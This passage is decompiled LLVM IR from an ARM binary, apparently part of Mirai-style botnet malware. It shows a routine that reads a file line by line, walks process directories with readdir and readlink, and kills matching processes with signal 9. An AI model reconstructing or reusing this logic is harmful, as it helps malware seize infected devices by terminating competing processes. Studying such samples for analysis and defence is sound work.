  %v1_cae8 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_caa8, %bb127 ], [ %v1_caa8, %dec_label_pc_caa8 ]
  %v0_cabc = phi i32 [ %v4_ca88, %.thread8 ], [ %v4_ca88, %bb126 ], [ %v6_caac, %bb127 ], [ %v6_caac, %dec_label_pc_caa8 ]
  %v2_cabc = icmp eq i32 %v0_cabc, 0
  br i1 %v2_cabc, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cac4

dec_label_pc_ca6c.backedge:                       ; preds = %dec_label_pc_cabc, %dec_label_pc_cb8c, %dec_label_pc_cbd8, %dec_label_pc_cb08
  %v0_ca74 = load i32, i32* @r8, align 4
  %v4_ca78 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_ca74)
  %v2_ca7c = icmp eq i32 %v4_ca78, 0
  br i1 %v2_ca7c, label %dec_label_pc_cc04.loopexit, label %dec_label_pc_ca84

dec_label_pc_cac4:                                ; preds = %dec_label_pc_cabc
  %v1_cac8 = add i32 %v1_cae8, 2
  %v2_cad0 = add i32 %v1_cac8, %v2_cacc
  %v1_cad4 = add i32 %v2_cad0, -545
  %v2_cad4 = inttoptr i32 %v1_cad4 to i8*
  %v3_cad4 = load i8, i8* %v2_cad4, align 1
  %v2_cad8 = icmp eq i8 %v3_cad4, 0
  br i1 %v2_cad8, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_cac4
  %v8_cadc = icmp eq i8 %v3_cad4, 32
  br i1 %v8_cadc, label %.thread13, label %dec_label_pc_cae8

.thread13:                                        ; preds = %bb128
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb129:                                            ; preds = %dec_label_pc_cac4
  store i32 %v1_cac8, i32* @r5, align 4
  br label %dec_label_pc_cb08

dec_label_pc_cae8:                                ; preds = %bb128
  %v0_cae8 = load i32, i32* @r6, align 4
  %v2_cae8 = add i32 %v0_cae8, %v1_cae8
  br label %dec_label_pc_caf0

dec_label_pc_caf0:                                ; preds = %bb130, %dec_label_pc_cae8
  %v0_cafc16 = phi i32 [ %v1_cafc, %bb130 ], [ %v1_cac8, %dec_label_pc_cae8 ]
  %v0_cb0018 = phi i32 [ %v1_cb00, %bb130 ], [ %v2_cae8, %dec_label_pc_cae8 ]
  %v1_caf0 = add i32 %v0_cb0018, 3
  %v2_caf0 = inttoptr i32 %v1_caf0 to i8*
  %v3_caf0 = load i8, i8* %v2_caf0, align 1
  %v2_caf4 = icmp eq i8 %v3_caf0, 0
  br i1 %v2_caf4, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_caf0
  %v1_cafc17 = add i32 %v0_cafc16, 1
  store i32 %v1_cafc17, i32* @r5, align 4
  br label %dec_label_pc_cb08

bb130:                                            ; preds = %dec_label_pc_caf0
  %v8_caf8 = icmp eq i8 %v3_caf0, 32
  %v1_cafc = add i32 %v0_cafc16, 1
  store i32 %v1_cafc, i32* @r5, align 4
  %v1_cb00 = add i32 %v0_cb0018, 1
  br i1 %v8_caf8, label %dec_label_pc_cb08, label %dec_label_pc_caf0

dec_label_pc_cb08:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb14 = phi i32 [ %v1_cafc17, %.thread15 ], [ %v1_cac8, %.thread13 ], [ %v1_cac8, %bb129 ], [ %v1_cafc, %bb130 ]
  %v0_cb08 = load i32, i32* @r6, align 4
  %v2_cb08 = add i32 %v0_cb08, %v1_cac8
  store i32 %v2_cb08, i32* @r4, align 4
  %v2_cb14 = add i32 %v1_cb14, %v2_cacc
  store i32 0, i32* @r7, align 4
  %v3_cb1c = add i32 %v2_cb14, -545
  %v4_cb1c = inttoptr i32 %v3_cb1c to i8*
  store i8 0, i8* %v4_cb1c, align 1
  %v0_cb20 = load i32, i32* @r4, align 4
  %v1_cb24 = inttoptr i32 %v0_cb20 to i8*
  %v2_cb24 = call i32 @util_strlen(i8* %v1_cb24)
  store i32 %v2_cb24, i32* @r1, align 4
  %v0_cb30 = load i32, i32* @r4, align 4
  %v3_cb34 = inttoptr i32 %v0_cb30 to i8*
  %v4_cb34 = call i32 @util_stristr(i8* %v3_cb34, i32 %v2_cb24, i32 %v2_c9fc)
  %v7_cb38 = icmp eq i32 %v4_cb34, -1
  br i1 %v7_cb38, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb54.preheader

dec_label_pc_cb54.preheader:                      ; preds = %dec_label_pc_cb08
  %v1_cb3c = load i32, i32* @r7, align 4
  %v1_cb40 = load i32, i32* @r6, align 4
  %v2_cb40 = load i32, i32* @r5, align 4
  %v3_cb40 = add i32 %v2_cb40, %v1_cb40
  store i32 %v1_cb3c, i32* @lr, align 4
  %v1_cb5448 = add i32 %v3_cb40, 2
  %v2_cb5449 = inttoptr i32 %v1_cb5448 to i8*
  %v3_cb5450 = load i8, i8* %v2_cb5449, align 1
  %v4_cb5451 = zext i8 %v3_cb5450 to i32
  store i32 %v4_cb5451, i32* @r3, align 4
  %v2_cb5852 = icmp eq i8 %v3_cb5450, 0
  %v1_cb5c54 = add i32 %v2_cb40, 2
  br i1 %v2_cb5852, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_cb64:                                ; preds = %dec_label_pc_cb54.preheader, %dec_label_pc_cb54.backedge
  %v0_cb8c83 = phi i32 [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb74.pr = phi i32 [ %v0_cb74.pr70, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_ce94 = phi i32 [ %v0_ce9473, %dec_label_pc_cb54.backedge ], [ %v1_cb3c, %dec_label_pc_cb54.preheader ]
  %v0_cb5c78 = phi i32 [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v1_cb5c54, %dec_label_pc_cb54.preheader ]
  %v0_cb84 = phi i32 [ %v0_cb54, %dec_label_pc_cb54.backedge ], [ %v3_cb40, %dec_label_pc_cb54.preheader ]
  %v1_cb68 = phi i32 [ %v4_cb54, %dec_label_pc_cb54.backedge ], [ %v4_cb5451, %dec_label_pc_cb54.preheader ]
  %v7_cb64 = icmp eq i32 %v1_cb68, 9
  br i1 %v7_cb64, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb64
  %v8_cb68 = icmp eq i32 %v1_cb68, 32
  br i1 %v8_cb68, label %.thread27, label %dec_label_pc_cb74

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cb80

bb132:                                            ; preds = %dec_label_pc_cb64
  br label %dec_label_pc_cb80

dec_label_pc_cb74:                                ; preds = %bb131
  %v7_cb74 = icmp eq i32 %v0_cb74.pr, 1
  br i1 %v7_cb74, label %dec_label_pc_ce94, label %dec_label_pc_cb7c

dec_label_pc_cb7c:                                ; preds = %dec_label_pc_ce94, %dec_label_pc_cb74
  %v0_cb8075 = phi i32 [ %v1_ce94, %dec_label_pc_ce94 ], [ %v0_ce94, %dec_label_pc_cb74 ]
  br label %dec_label_pc_cb80

dec_label_pc_cb80:                                ; preds = %bb132, %.thread27, %dec_label_pc_cb7c
  %v0_cb80 = phi i32 [ %v0_ce94, %.thread27 ], [ %v0_ce94, %bb132 ], [ %v0_cb8075, %dec_label_pc_cb7c ]
  %v0_cb74.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cb7c ]
  %v7_cb88 = icmp sgt i32 %v0_cb80, 6
  br i1 %v7_cb88, label %dec_label_pc_cb8c, label %dec_label_pc_cb54.backedge

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_cb54.backedge, %dec_label_pc_cb80, %dec_label_pc_cb54.preheader
  %v1_cbdc = phi i32 [ %v1_cb5c54, %dec_label_pc_cb54.preheader ], [ %v1_cb5c, %dec_label_pc_cb54.backedge ], [ %v0_cb5c78, %dec_label_pc_cb80 ]
  %v0_cb8c = phi i32 [ %v1_cb3c, %dec_label_pc_cb54.preheader ], [ %v0_cb8c81, %dec_label_pc_cb54.backedge ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v2_cb8c = icmp eq i32 %v0_cb8c, 0
  br i1 %v2_cb8c, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb8c
  %v2_cba0 = add i32 %v1_cbdc, %v2_cacc
  %v1_cba4 = add i32 %v2_cba0, -545
  %v2_cba4 = inttoptr i32 %v1_cba4 to i8*
  %v3_cba4 = load i8, i8* %v2_cba4, align 1
  %v2_cba8 = icmp eq i8 %v3_cba4, 0
  br i1 %v2_cba8, label %dec_label_pc_cbd8, label %bb133

bb133:                                            ; preds = %dec_label_pc_cb98
  %v8_cbac = icmp eq i8 %v3_cba4, 32
  br i1 %v8_cbac, label %dec_label_pc_cbd8, label %dec_label_pc_cbb4

dec_label_pc_cbb4:                                ; preds = %bb133
  %v2_cbb4 = add i32 %v1_cbdc, %v1_cb40
  br label %dec_label_pc_cbb8

dec_label_pc_cbb8:                                ; preds = %bb134, %dec_label_pc_cbb4
  %v0_cbc430 = phi i32 [ %v1_cbc4, %bb134 ], [ %v1_cbdc, %dec_label_pc_cbb4 ]
  %v0_cbb8 = phi i32 [ %v1_cbb8, %bb134 ], [ %v2_cbb4, %dec_label_pc_cbb4 ]
  %v1_cbb8 = add i32 %v0_cbb8, 1
  %v2_cbb8 = inttoptr i32 %v1_cbb8 to i8*
  %v3_cbb8 = load i8, i8* %v2_cbb8, align 1
  %v2_cbbc = icmp eq i8 %v3_cbb8, 0
  br i1 %v2_cbbc, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbb8
  %v1_cbc431 = add i32 %v0_cbc430, 1
  br label %dec_label_pc_cbcc

bb134:                                            ; preds = %dec_label_pc_cbb8
  %v8_cbc0 = icmp eq i8 %v3_cbb8, 32
  %v1_cbc4 = add i32 %v0_cbc430, 1
  br i1 %v8_cbc0, label %dec_label_pc_cbcc, label %dec_label_pc_cbb8

dec_label_pc_cbcc:                                ; preds = %bb134, %.thread29
  %v1_cbd4 = phi i32 [ %v1_cbc431, %.thread29 ], [ %v1_cbc4, %bb134 ]
  %v2_cbd4 = add i32 %v1_cbd4, %v2_cacc
  br label %dec_label_pc_cbd8

dec_label_pc_cbd8:                                ; preds = %dec_label_pc_cb98, %bb133, %dec_label_pc_cbcc
  %v2_cbe4 = phi i32 [ %v2_cba0, %dec_label_pc_cb98 ], [ %v2_cba0, %bb133 ], [ %v2_cbd4, %dec_label_pc_cbcc ]
  %v2_cbdc = add i32 %v1_cbdc, %v1_cb40
  store i32 %v2_cbdc, i32* @r4, align 4
  %v3_cbe4 = add i32 %v2_cbe4, -545
  %v4_cbe4 = inttoptr i32 %v3_cbe4 to i8*
  store i8 0, i8* %v4_cbe4, align 1
  %v1_cbe8 = inttoptr i32 %v2_cbdc to i8*
  %v2_cbe8 = call i32 @util_strlen(i8* %v1_cbe8)
  %v8_cbf0 = icmp sgt i32 %v2_cbe8, 15
  br i1 %v8_cbf0, label %dec_label_pc_ca6c.backedge, label %dec_label_pc_cbf4

dec_label_pc_cbf4:                                ; preds = %dec_label_pc_cbd8
  %v0_cbf8 = load i32, i32* @r4, align 4
  %v2_cbfc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cbfc, i32* @r0, align 4
  %v2_cc00 = bitcast i32* %stack_var_-56 to i8*
  %v3_cc00 = call i32 @util_strcpy(i8* %v2_cc00, i32 %v0_cbf8)
  br label %dec_label_pc_cc04

dec_label_pc_cc04.loopexit:                       ; preds = %dec_label_pc_ca6c.backedge, %dec_label_pc_ca6c.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cc04.loopexit, %dec_label_pc_cbf4
  %v1_cc14.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc04.loopexit ], [ %v2_cc00, %dec_label_pc_cbf4 ]
  %v2_cc10.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc04.loopexit ], [ %v2_cbfc, %dec_label_pc_cbf4 ]
  %v0_cc04 = load i32, i32* @r8, align 4
  %v1_cc08 = call i32 @__GI___libc_close(i32 %v0_cc04)
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14.pre-phi)
  store i32 %v2_cc14, i32* @r4, align 4
  %v2_cc18 = icmp eq i32 %v2_cc14, 0
  br i1 %v2_cc18, label %dec_label_pc_cec0, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v3_cc28 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_cc2c = call i32 @__GI_opendir(i32 %v3_cc28)
  store i32 %v1_cc2c, i32* @sb, align 4
  %v2_cc30 = icmp eq i32 %v1_cc2c, 0
  br i1 %v2_cc30, label %dec_label_pc_ce60, label %dec_label_pc_cc40.preheader

dec_label_pc_cc40.preheader:                      ; preds = %dec_label_pc_cc20
  store i32 0, i32* @r5, align 4
  %v1_cc4443 = inttoptr i32 %v1_cc2c to i32*
  %v2_cc4444 = call i32 @__GI_readdir(i32* %v1_cc4443)
  %v2_cc4846 = icmp eq i32 %v2_cc4444, 0
  br i1 %v2_cc4846, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc40.loopexit:                       ; preds = %dec_label_pc_cc58, %dec_label_pc_cc68, %dec_label_pc_ccd4
  %v0_cc40 = load i32, i32* @sb, align 4
  %v1_cc44 = inttoptr i32 %v0_cc40 to i32*
  %v2_cc44 = call i32 @__GI_readdir(i32* %v1_cc44)
  %v2_cc48 = icmp eq i32 %v2_cc44, 0
  br i1 %v2_cc48, label %dec_label_pc_ce54, label %dec_label_pc_cc50.preheader

dec_label_pc_cc50.preheader:                      ; preds = %dec_label_pc_cc40.preheader, %dec_label_pc_cc40.loopexit
  %v0_cc5891 = phi i32 [ %v2_cc44, %dec_label_pc_cc40.loopexit ], [ %v2_cc4444, %dec_label_pc_cc40.preheader ]
  br label %dec_label_pc_cc50

dec_label_pc_cc50:                                ; preds = %dec_label_pc_cc50.preheader, %dec_label_pc_ce3c
  %v0_cc70 = phi i32 [ %v0_cc5891, %dec_label_pc_cc50.preheader ], [ %v2_ce48, %dec_label_pc_ce3c ]
  %v0_cc50 = load i32, i32* @r5, align 4
  %v2_cc50 = icmp eq i32 %v0_cc50, 0
  br i1 %v2_cc50, label %dec_label_pc_cc58, label %dec_label_pc_ce54

dec_label_pc_cc58:                                ; preds = %dec_label_pc_cc50
  %v1_cc58 = add i32 %v0_cc70, 11
  %v2_cc58 = inttoptr i32 %v1_cc58 to i8*
  %v3_cc58 = load i8, i8* %v2_cc58, align 1
  %v4_cc58 = zext i8 %v3_cc58 to i32
  %v1_cc5c = add nsw i32 %v4_cc58, -48
  %tmp = icmp ugt i32 %v1_cc5c, 9
  br i1 %tmp, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cc68

dec_label_pc_cc68:                                ; preds = %dec_label_pc_cc58
  store i32 %v1_cc58, i32* @r7, align 4
  %v3_cc74 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cc80 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cc74)
  %v2_cc88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cc8c = load i32, i32* @r7, align 4
  %v1_cc90 = load i32, i32* @sl, align 4
  %v2_cc90 = add i32 %v1_cc90, %v2_cc88
  store i32 %v2_cc90, i32* @r0, align 4
  %v2_cc94 = inttoptr i32 %v2_cc90 to i8*
  %v3_cc94 = call i32 @util_strcpy(i8* %v2_cc94, i32 %v0_cc8c)
  %v2_cc9c = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cca0 = load i32, i32* @r5, align 4
  store i32 %v2_cc9c, i32* @r4, align 4
  %v2_ccac = inttoptr i32 %v0_cca0 to i32*
  %v3_ccac = call i32 @table_retrieve_val(i32 14, i32* %v2_ccac)
  %v0_ccb4 = load i32, i32* @r4, align 4
  %v1_ccb4 = load i32, i32* @sl, align 4
  %v2_ccb4 = add i32 %v1_ccb4, %v0_ccb4
  store i32 %v2_ccb4, i32* @r0, align 4
  %v2_ccb8 = inttoptr i32 %v2_ccb4 to i8*
  %v3_ccb8 = call i32 @util_strcpy(i8* %v2_ccb8, i32 %v3_ccac)
  %v3_ccc8 = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cccc = icmp eq i32 %v3_ccc8, -1
  br i1 %v7_cccc, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_ccd4

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_cc68
  %v0_ccd4 = load i32, i32* @r5, align 4
  %v2_ccdc = inttoptr i32 %v0_ccd4 to i32*
  %v3_ccdc = call i32 @table_retrieve_val(i32 13, i32* %v2_ccdc)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cce8 = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_ccdc)
  %v2_ccf0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_ccf4 = load i32, i32* @r7, align 4
  %v1_ccf8 = load i32, i32* @sl, align 4
  %v2_ccf8 = add i32 %v1_ccf8, %v2_ccf0
  store i32 %v2_ccf8, i32* @r0, align 4
  %v2_ccfc = inttoptr i32 %v2_ccf8 to i8*
  %v3_ccfc = call i32 @util_strcpy(i8* %v2_ccfc, i32 %v0_ccf4)
  %v2_cd04 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd08 = load i32, i32* @r5, align 4
  store i32 %v2_cd04, i32* @r4, align 4
  %v2_cd14 = inttoptr i32 %v0_cd08 to i32*
  %v3_cd14 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd14)
  %v0_cd1c = load i32, i32* @r4, align 4
  %v1_cd1c = load i32, i32* @sl, align 4
  %v2_cd1c = add i32 %v1_cd1c, %v0_cd1c
  store i32 %v2_cd1c, i32* @r0, align 4
  %v2_cd20 = inttoptr i32 %v2_cd1c to i8*
  %v3_cd20 = call i32 @util_strcpy(i8* %v2_cd20, i32 %v3_cd14)
  %v1_cd28 = call i32 @__GI_opendir(i32 %v2_c9d4)
  store i32 %v1_cd28, i32* @r8, align 4
  %v2_cd2c = icmp eq i32 %v1_cd28, 0
  br i1 %v2_cd2c, label %dec_label_pc_cc40.loopexit, label %dec_label_pc_cd34.preheader

dec_label_pc_cd34.preheader:                      ; preds = %dec_label_pc_ccd4
  %v1_cd3838 = inttoptr i32 %v1_cd28 to i32*
  %v2_cd3839 = call i32 @__GI_readdir(i32* %v1_cd3838)
  store i32 %v2_cd3839, i32* @r6, align 4
  %v2_cd3c41 = icmp eq i32 %v2_cd3839, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c41, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd34.loopexit:                       ; preds = %dec_label_pc_cd54, %dec_label_pc_cdec
  %v0_cd34 = load i32, i32* @r8, align 4
  %v1_cd38 = inttoptr i32 %v0_cd34 to i32*
  %v2_cd38 = call i32 @__GI_readdir(i32* %v1_cd38)
  store i32 %v2_cd38, i32* @r6, align 4
  %v2_cd3c = icmp eq i32 %v2_cd38, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_cd3c, label %dec_label_pc_ce3c, label %dec_label_pc_cd4cthread-pre-split

dec_label_pc_cd4cthread-pre-split:                ; preds = %dec_label_pc_cd34.preheader, %dec_label_pc_cd34.loopexit
  %v0_cd4c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd4c

dec_label_pc_cd4c:                                ; preds = %dec_label_pc_cd4cthread-pre-split, %dec_label_pc_ce14
  %v0_cd4c = phi i32 [ %v0_cd4c.pr, %dec_label_pc_cd4cthread-pre-split ], [ 1, %dec_label_pc_ce14 ]
  %v2_cd4c = icmp eq i32 %v0_cd4c, 0
  br i1 %v2_cd4c, label %dec_label_pc_cd54, label %dec_label_pc_ce3c

dec_label_pc_cd54:                                ; preds = %dec_label_pc_cd4c
  %v0_cd54 = call i32 @util_zero()
  %v0_cd58 = load i32, i32* @r5, align 4
  %v2_cd60 = inttoptr i32 %v0_cd58 to i32*
  %v3_cd60 = call i32 @table_retrieve_val(i32 13, i32* %v2_cd60)
  store i32 %v2_c9d4, i32* @r0, align 4
  %v3_cd6c = call i32 @util_strcpy(i8* %v3_c9f8, i32 %v3_cd60)
  %v2_cd74 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd78 = load i32, i32* @r7, align 4
  %v1_cd7c = load i32, i32* @sl, align 4
  %v2_cd7c = add i32 %v1_cd7c, %v2_cd74
  store i32 %v2_cd7c, i32* @r0, align 4
  %v2_cd80 = inttoptr i32 %v2_cd7c to i8*
  %v3_cd80 = call i32 @util_strcpy(i8* %v2_cd80, i32 %v0_cd78)
  %v2_cd88 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cd8c = load i32, i32* @r5, align 4
  store i32 %v2_cd88, i32* @r4, align 4
  %v2_cd98 = inttoptr i32 %v0_cd8c to i32*
  %v3_cd98 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd98)
  %v0_cda0 = load i32, i32* @r4, align 4
  %v1_cda0 = load i32, i32* @sl, align 4
  %v2_cda0 = add i32 %v1_cda0, %v0_cda0
  store i32 %v2_cda0, i32* @r0, align 4
  %v2_cda4 = inttoptr i32 %v2_cda0 to i8*
  %v3_cda4 = call i32 @util_strcpy(i8* %v2_cda4, i32 %v3_cd98)
  %v2_cdac = call i32 @util_strlen(i8* %v3_c9f8)
  %v1_cdb4 = load i32, i32* @sl, align 4
  %v2_cdb4 = add i32 %v1_cdb4, %v2_cdac
  store i32 %v2_cdb4, i32* @r0, align 4
  %v2_cdb8 = inttoptr i32 %v2_cdb4 to i8*
  %v3_cdb8 = call i32 @util_strcpy(i8* %v2_cdb8, i32 ptrtoint (i32* @global_var_196e8.68 to i32))
  %v2_cdc0 = call i32 @util_strlen(i8* %v3_c9f8)
  %v0_cdc4 = load i32, i32* @r6, align 4
  %v1_cdc4 = add i32 %v0_cdc4, 11
  %v1_cdc8 = load i32, i32* @sl, align 4
  %v2_cdc8 = add i32 %v1_cdc8, %v2_cdc0
  store i32 %v2_cdc8, i32* @r0, align 4
  %v2_cdcc = inttoptr i32 %v2_cdc8 to i8*
  %v3_cdcc = call i32 @util_strcpy(i8* %v2_cdcc, i32 %v1_cdc4)
  %v3_cddc = call i32 @readlink(i32 %v2_c9d4, i32 %v2_c9c4, i32 4096)
  %v7_cde0 = icmp eq i32 %v3_cddc, -1
  br i1 %v7_cde0, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_cdec

dec_label_pc_cdec:                                ; preds = %dec_label_pc_cd54
  %v2_cdec = call i32 @util_strlen(i8* %v3_c9e4)
  store i32 %v2_cdec, i32* @r1, align 4
  %v4_ce00 = call i32 @util_stristr(i8* %v3_c9e4, i32 %v2_cdec, i32 %v2_cc10.pre-phi)
  %v7_ce04 = icmp eq i32 %v4_ce00, -1
  br i1 %v7_ce04, label %dec_label_pc_cd34.loopexit, label %dec_label_pc_ce14

dec_label_pc_ce14:                                ; preds = %dec_label_pc_cdec
  %v0_ce0c = load i32, i32* @r7, align 4
  %v2_ce14 = inttoptr i32 %v0_ce0c to i8*
  %v3_ce14 = call i32 @util_atoi(i8* %v2_ce14, i32 10)
  %v2_ce1c = call i32 @kill(i32 %v3_ce14, i32 9)
  %v0_ce20 = load i32, i32* @r8, align 4
  %v1_ce24 = inttoptr i32 %v0_ce20 to i32*
  %v2_ce24 = call i32 @__GI_readdir(i32* %v1_ce24)
  store i32 %v2_ce24, i32* @r6, align 4
  %v2_ce28 = icmp eq i32 %v2_ce24, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9c4, i32* @r0, align 4
  br i1 %v2_ce28, label %dec_label_pc_ce3c, label %dec_label_pc_cd4c

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_cd34.loopexit, %dec_label_pc_ce14, %dec_label_pc_cd4c, %dec_label_pc_cd34.preheader
  %v0_ce3c = load i32, i32* @r8, align 4
  %v1_ce40 = inttoptr i32 %v0_ce3c to i32*
  %v2_ce40 = call i32 @__GI_closedir(i32* %v1_ce40)
  %v0_ce44 = load i32, i32* @sb, align 4
  %v1_ce48 = inttoptr i32 %v0_ce44 to i32*
  %v2_ce48 = call i32 @__GI_readdir(i32* %v1_ce48)
  %v2_ce4c = icmp eq i32 %v2_ce48, 0
  br i1 %v2_ce4c, label %dec_label_pc_ce54, label %dec_label_pc_cc50

dec_label_pc_ce54:                                ; preds = %dec_label_pc_cc40.loopexit, %dec_label_pc_ce3c, %dec_label_pc_cc50, %dec_label_pc_cc40.preheader
  %v0_ce54 = load i32, i32* @sb, align 4
  %v1_ce58 = inttoptr i32 %v0_ce54 to i32*
  %v2_ce58 = call i32 @__GI_closedir(i32* %v1_ce58)
  %v0_ce5c = load i32, i32* @r5, align 4
  %v1_ce5c = urem i32 %v0_ce5c, 256
  br label %dec_label_pc_ce60

dec_label_pc_ce60:                                ; preds = %dec_label_pc_cc20, %dec_label_pc_ce54
  %storemerge = phi i32 [ %v1_ce5c, %dec_label_pc_ce54 ], [ 0, %dec_label_pc_cc20 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce64 = call i32 @sleep(i32 1)
  %v1_ce6c = call i32 @table_lock_val(i32 13)
  %v1_ce74 = call i32 @table_lock_val(i32 14)
  %v1_ce7c = call i32 @table_lock_val(i32 15)
  br label %dec_label_pc_ce80

dec_label_pc_ce80:                                ; preds = %bb, %dec_label_pc_cec0, %dec_label_pc_ce60
  %v0_ce80 = load i32, i32* @r4, align 4
  store i32 %v3_c97c, i32* @r4, align 4
  store i32 %v6_c97c, i32* @r5, align 4
  store i32 %v9_c97c, i32* @r6, align 4
  store i32 %v12_c97c, i32* @r7, align 4
  store i32 %v15_c97c, i32* @r8, align 4
  store i32 %v18_c97c, i32* @sb, align 4
  store i32 %v21_c97c, i32* @sl, align 4
  store i32 %v24_c97c, i32* @fp, align 4
  store i32 %v27_c97c, i32* @lr, align 4
  ret i32 %v0_ce80

dec_label_pc_ce94:                                ; preds = %dec_label_pc_cb74
  %v1_ce94 = add i32 %v0_ce94, 1
  %v7_ce98 = icmp eq i32 %v0_ce94, 0
  br i1 %v7_ce98, label %dec_label_pc_cea0, label %dec_label_pc_cb7c

dec_label_pc_cea0:                                ; preds = %dec_label_pc_ce94
  %v1_cea0 = add i32 %v0_cb84, 3
  %v2_cea0 = inttoptr i32 %v1_cea0 to i8*
  %v3_cea0 = load i8, i8* %v2_cea0, align 1
  %v7_cea4 = icmp eq i8 %v3_cea0, 65
  br i1 %v7_cea4, label %dec_label_pc_ceb8, label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %dec_label_pc_cea0, %dec_label_pc_ceb8
  %v0_cb8c82 = phi i32 [ %v0_cb8c83, %dec_label_pc_cea0 ], [ 1, %dec_label_pc_ceb8 ]
  br label %dec_label_pc_cb54.backedge

dec_label_pc_cb54.backedge:                       ; preds = %dec_label_pc_ceac, %dec_label_pc_cb80
  %v0_cb8c81 = phi i32 [ %v0_cb8c82, %dec_label_pc_ceac ], [ %v0_cb8c83, %dec_label_pc_cb80 ]
  %v0_ce9473 = phi i32 [ %v1_ce94, %dec_label_pc_ceac ], [ %v0_cb80, %dec_label_pc_cb80 ]
  %v0_cb74.pr70 = phi i32 [ 0, %dec_label_pc_ceac ], [ %v0_cb74.pr71, %dec_label_pc_cb80 ]
  %v0_cb54 = add i32 %v0_cb84, 1
  %v1_cb54 = add i32 %v0_cb84, 3
  %v2_cb54 = inttoptr i32 %v1_cb54 to i8*
  %v3_cb54 = load i8, i8* %v2_cb54, align 1
  %v4_cb54 = zext i8 %v3_cb54 to i32
  store i32 %v4_cb54, i32* @r3, align 4
  %v2_cb58 = icmp eq i8 %v3_cb54, 0
  %v1_cb5c = add i32 %v0_cb5c78, 1
  br i1 %v2_cb58, label %dec_label_pc_cb8c, label %dec_label_pc_cb64

dec_label_pc_ceb8:                                ; preds = %dec_label_pc_cea0
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cc04
  %v1_cec4 = call i32 @table_lock_val(i32 13)
  %v1_cecc = call i32 @table_lock_val(i32 14)
  %v1_ced4 = call i32 @table_lock_val(i32 15)
  %v1_cedc = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ce80

dec_label_pc_cee4:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca28

; uselistorder directives
  uselistorder i32 %v1_cb5c, { 1, 0 }
  uselistorder i32 %v4_cb54, { 1, 0 }
  uselistorder i32 %v0_cb8c81, { 1, 0 }
  uselistorder i32 %v1_ce94, { 1, 0 }
  uselistorder i32 %v2_ce48, { 1, 0 }
  uselistorder i32 %v1_cbb8, { 1, 0 }
  uselistorder i32 %v0_cbc430, { 1, 0 }
  uselistorder i32 %v1_cbdc, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cb80, { 1, 0 }
  uselistorder i32 %v0_cb5c78, { 1, 0 }
  uselistorder i32 %v0_ce94, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cb8c83, { 1, 2, 0 }
  uselistorder i32 %v1_cb5c54, { 1, 0 }
  uselistorder i32 %v2_cb40, { 1, 0 }
